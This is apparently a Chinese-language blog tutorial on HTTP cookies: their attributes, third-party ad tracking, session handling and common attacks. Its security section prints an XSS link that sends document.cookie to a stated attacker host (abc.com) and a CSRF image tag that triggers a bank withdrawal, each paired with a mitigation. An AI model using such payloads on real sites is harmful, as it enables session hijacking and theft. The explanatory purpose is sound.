# cookie

### 前言

网络早期最大的问题之一是如何管理状态。简而言之，服务器无法知道两个请求是否来自同一个浏览器。当时最简单的方法是在请求时，在页面中插入一些参数，并在下一个请求中传回参数。这需要使用包含参数的隐藏的表单，或者作为 URL 参数的一部分传递。这两个解决方案都手动操作，容易出错。

网景公司当时一名员工 Lou Montulli，在 1994 年将“cookies”的概念应用于网络通信，用来解决用户网上购物的购物车历史记录，目前所有浏览器都支持 cookies。

### cookie 是什么

cookie 翻译过来是“饼干，甜品”的意思，cookie 在网络应用中到处存在，当我们浏览之前访问过的网站，网页中可能会显示：你好，王三少，这就会让我们感觉很亲切，像吃了一块很甜的饼干一样。

由于 http 是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢？那就给每次新的用户请求时，给它颁发一个身份证（独一无二）吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是 Cookie 的原理。

其实 cookie 是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie 是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的 cookie，这些 cookie 可以用来辨别用户身份信息等作用。

![img](https://images2017.cnblogs.com/blog/1203274/201712/1203274-20171209110335937-33858862.png)

如图所示,用户首次访问服务器，服务器会返回一个独一无二的识别码；id=23451，这样服务器可以用这个码跟踪记录用户的信息，（购物历史，地址信息等）。

cookie 可以包含任意的信息，不仅仅是 id，客户端会记录服务器返回来的 Set-Cookie 首部中的 cookie 内容。并将 cookie 存储在浏览器的 cookie 数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的 id=XXX 的身份证（cookie），并在 Cookie 请求首部发送过去。

### cookie 的类型

可以按照过期时间分为两类：会话 cookie 和持久 cookie。会话 cookie 是一种临时 cookie，用户退出浏览器，会话 Cookie 就会被删除了，持久 cookie 则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的 cookie 会维护某一个用户周期性访问服务器的配置文件或者登录信息。

> 持久 cookie 设置一个特定的过期时间（Expires）或者有效期（Max-Age）

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2019 07:28:00 GMT;
```

### cookie 的属性

#### cookie 的域

产生 Cookie 的服务器可以向 set-Cookie 响应首部添加一个 Domain 属性来控制哪些站点可以看到那个 cookie，例如下面：

```
Set-Cookie: name="wang"; domain="m.zhuanzhuan.58.com"
```

如果用户访问的是 m.zhuanzhuan.58.com 那就会发送 cookie: name="wang", 如果用户访问 www.aaa.com（非 zhuanzhuan.58.com）就不会发送这个 Cookie。

#### cookie 的路径 Path

Path 属性可以为服务器特定文档指定 Cookie，这个属性设置的 url 且带有这个前缀的 url 路径都是有效的。

例如：m.zhuanzhuan.58.com 和 m.zhaunzhuan.58.com/user/这两个 url。 m.zhuanzhuan.58.com 设置 cookie

```
Set-cookie: id="123432";domain="m.zhuanzhuan.58.com";
```

m.zhaunzhuan.58.com/user/ 设置 cookie：

```
Set-cookie：user="wang", domain="m.zhuanzhuan.58.com"; path=/user/
```

但是访问其他路径 m.zhuanzhuan.58.com/other/就会获得

```
cookie: id="123432"
```

如果访问 m.zhuanzhuan.58.com/user/就会获得

```
  cookie: id="123432"
  cookie: user="wang"
```

#### secure

设置了属性 secure，cookie 只有在 https 协议加密情况下才会发送给服务端。但是这并不是最安全的，由于其固有的不安全性，敏感信息也是不应该通过 cookie 传输的.

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure;
```

> chrome 52 和 firefox 52 开始不安全的（HTTP）是无法使用 secure 的：

### 操作 Cookie

通过 docuemnt.cookie 可以设置和获取 Cookie 的值

```
document.cookie = "user=wang";
console.log(document.cookie);
```

> 禁止 javascript 操作 cookie（为避免跨域脚本(xss)攻击，通过 javascript 的 document.cookie 无法访问带有 HttpOnly 标记的 cookie。）

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2017 07:28:00 GMT; Secure; HttpOnly
```

### 第三方 cookie

通常 cookie 的域和浏览器地址的域匹配，这被称为第一方 cookie。那么第三方 cookie 就是 cookie 的域和地址栏中的域不匹配，这种 cookie 通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。

![img](https://images2017.cnblogs.com/blog/1203274/201712/1203274-20171209110357077-116554782.png)

如上图（a）：用户访问服务器 1 的一个页面 index.html，这个页面和第三方广告网站合作，这个页面还有一张 www.advertisement.com 域名下的一张广告图 ad1.jpg，当请求这张 ad1.jpg 图片的时候，www.advertisement.com 这个服务器会给用户设置 cookie

```
Set-Cookie: user="wang";like="a"; domain="advertisement.com"
```

记录用户的浏览记录，分配一个 user 来表示用户的身份。

图（b）：用户访问服务器 2 的一个 index.html 页面，这个页面也和同一家广告商合作，这个页面也包含一张 www.advertisement.com 域名下的一张广告图 ad2.jpg，当请求这张 ad2.jpg 图片的时候，浏览器就会向 www.advertisement.com 发送 cookie

```
Cookie:  user="wang"; like="a";
```

www.advertisement.com 收到浏览器发送的 cookie 识别了用户的身份，同时又把这个页面用户的浏览数据设置 cookie

```
Set-Cookie: buy="b"; domain="advertisement.com"
```

图（c）：很巧，用户访问服务器 3 的一个 index.html 页面，这个页面也和那一家广告商合作，这个页面也包含一张 www.advertisement.com 域名下的一张广告图 ad3.jpg，当请求这张 ad3.jpg 图片的时候，浏览器就会向 www.advertisement.com 发送 cookie

```
Cookie:  user="wang"; like="a"; buy="b"
```

这样广告公司就可以根据用户的浏览习惯，给用户推送合适的广告。

### 安全

多数网站使用 cookie 作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用 cookies 作为会话标识符，攻击者可以通过窃取一套用户的 cookies 来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。 下面介绍几种 cookie 盗用和会话劫持的例子：

#### 网络窃听

网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式 WIFI。这种流量包含在普通的未加密的 HTTP 清求上发送 Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含 HTTP Cookie 的全部内容，以便进行中间的攻击。比如：拦截 cookie 来冒充用户身份执行恶意任务（银行转账等）。

解决办法：服务器可以设置 secure 属性的 cookie，这样就只能通过 https 的方式来发送 cookies 了。

#### DNS 缓存中毒

如果攻击者可以使[DNS 缓存中毒](http://https//en.wikipedia.org/wiki/DNS_spoofing/)，那么攻击者就可以访问用户的 Cookie 了，例如：攻击者使用 DNS 中毒来创建一个虚拟的 NDS 服务 h123456.[www.demo.com 指向攻击者服务器的 ip 地址。然后攻击者可以从服务器](http://www.demo.xn--comip-6f6hw2bc3fdvhh7bbfw06ls8fp4g168de15a.xn--0mqyb70mbta95cjf75njq1b7od7q7ath1b/) h123456.[www.demo.com/img_01.png](http://www.demo.com/img_01.png) 发布图片。用户访问这个图片，由于 www.demo.com 和 h123456.www.demo.com 是同一个子域，所以浏览器会把用户的与 www.demo.com 相关的 cookie 都会发送到 h123456.www.demo.com 这个服务器上，这样攻击者就会拿到用户的 cookie 搞事情。

一般情况下是不会发生这种情况，通常是网络供应商错误。

#### 跨站点脚本 XSS

使用跨站点脚本技术可以窃取 cookie。当网站允许使用 javascript 操作 cookie 的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的 cookie 信息。

例子：

```
<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
```

当用户点击这个链接的时候，浏览器就会执行 onclick 里面的代码，结果这个网站用户的 cookie 信息就会被发送到 abc.com 攻击者的服务器。攻击者同样可以拿 cookie 搞事情。

解决办法：可以通过 cookie 的 HttpOnly 属性，设置了 HttpOnly 属性，javascript 代码将不能操作 cookie。

#### 跨站请求伪造 CSRF

例如，SanShao 可能正在浏览其他用户 XiaoMing 发布消息的聊天论坛。假设 XiaoMing 制作了一个引用 ShanShao 银行网站的 HTML 图像元素，例如，

```
<img  src = "http://www.bank.com/withdraw?user=SanShao&amount=999999&for=XiaoMing" >
```

如果 SanShao 的银行将其认证信息保存在 cookie 中，并且 cookie 尚未过期，(当然是没有其他验证身份的东西)，那么 SanShao 的浏览器尝试加载该图片将使用他的 cookie 提交提款表单，从而在未经 SanShao 批准的情况下授权交易。

解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。

### cookie/Session 机制详解

会话（Session）跟踪是 Web 程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是 Cookie 与 Session。Cookie 通过在客户端记录信息确定用户身份，Session 通过在服务器端记录信息确定用户身份。

在程序中，会话跟踪是很重要的事情。理论上，一个用户的所有请求操作都应该属于同一个会话，而另一个用户的所有请求操作则应该属于另一个会话，二者不能混淆。例如，用户 A 在超市购买的任何商品都应该放在 A 的购物车内，不论是用户 A 什么时间购买的，这都是属于同一个会话的，不能放入用户 B 或用户 C 的购物车内，这不属于同一个会话。
而 Web 应用程序是使用 HTTP 协议传输数据的。HTTP 协议是无状态的协议。一旦数据交换完毕，客户端与服务器端的连接就会关闭，再次交换数据需要建立新的连接。这就意味着服务器无法从连接上跟踪会话。即用户 A 购买了一件商品放入购物车内，当再次购买商品时服务器已经无法判断该购买行为是属于用户 A 的会话还是用户 B 的会话了。要跟踪该会话，必须引入一种机制。
Cookie 就是这样的一种机制。它可以弥补 HTTP 协议无状态的不足。在 Session 出现之前，基本上所有的网站都采用 Cookie 来跟踪会话。

很多网站都会使用 Cookie。例如，Google 会向客户端颁发 Cookie，Baidu 也会向客户端颁发 Cookie。那浏览器访问 Google 会不会也携带上 Baidu 颁发的 Cookie 呢？或者 Google 能不能修改 Baidu 颁发的 Cookie 呢？
答案是否定的。Cookie 具有不可跨域名性。根据 Cookie 规范，浏览器访问 Google 只会携带 Google 的 Cookie，而不会携带 Baidu 的 Cookie。Google 也只能操作 Google 的 Cookie，而不能操作 Baidu 的 Cookie。
Cookie 在客户端是由浏览器来管理的。浏览器能够保证 Google 只会操作 Google 的 Cookie 而不会操作 Baidu 的 Cookie，从而保证用户的隐私安全。浏览器判断一个网站是否能操作另一个网站 Cookie 的依据是域名。Google 与 Baidu 的域名不一样，因此 Google 不能操作 Baidu 的 Cookie。
需要注意的是，虽然网站 images.google.com 与网站 www.google.com 同属于 Google，但是域名不一样，二者同样不能互相操作彼此的 Cookie。
注意：用户登录网站 www.google.com 之后会发现访问 images.google.com 时登录信息仍然有效，而普通的 Cookie 是做不到的。这是因为 Google 做了特殊处理。本章后面也会对 Cookie 做类似的处理。

Cookie 不仅可以使用 ASCII 字符与 Unicode 字符，还可以使用二进制数据。例如在 Cookie 中使用数字证书，提供安全度。使用二进制数据时也需要进行编码。

除了 name 与 value 之外，Cookie 还具有其他几个常用的属性。每个属性对应一个 getter 方法与一个 setter 方法。Cookie 类的所有属性如表 1.1 所示。
表 1.1 Cookie 常用属性
属性名 描述
String name 该 Cookie 的名称。Cookie 一旦创建，名称便不可更改
Object value 该 Cookie 的值。如果值为 Unicode 字符，需要为字符编码。如果值为二进制数据，则需要使用 BASE64 编码
int maxAge 该 Cookie 失效的时间，单位秒。如果为正数，则该 Cookie 在 maxAge 秒之后失效。如果为负数，该 Cookie 为临时 Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该 Cookie。如果为 0，表示删除该 Cookie。默认为–1
boolean secure 该 Cookie 是否仅被使用安全协议传输。安全协议。安全协议有 HTTPS，SSL 等，在网络上传输数据之前先将数据加密。默认为 false
String path 该 Cookie 的使用路径。如果设置为 “/sessionWeb/”，则只有 contextPath 为“/sessionWeb” 的程序可以访问该 Cookie。如果设置为“/”，则本域名下 contextPath 都可以访问该 Cookie。注意最后一个字符必须为“/”
String domain 可以访问该 Cookie 的域名。如果设置为 “.google.com”，则所有以“google.com” 结尾的域名都可以访问该 Cookie。注意第一个字符必须为“.”
String comment 该 Cookie 的用处说明。浏览器显示 Cookie 信息的时候显示该说明
int version 该 Cookie 使用的版本号。0 表示遵循 Netscape 的 Cookie 规范，1 表示遵循 W3C 的 RFC 2109 规范
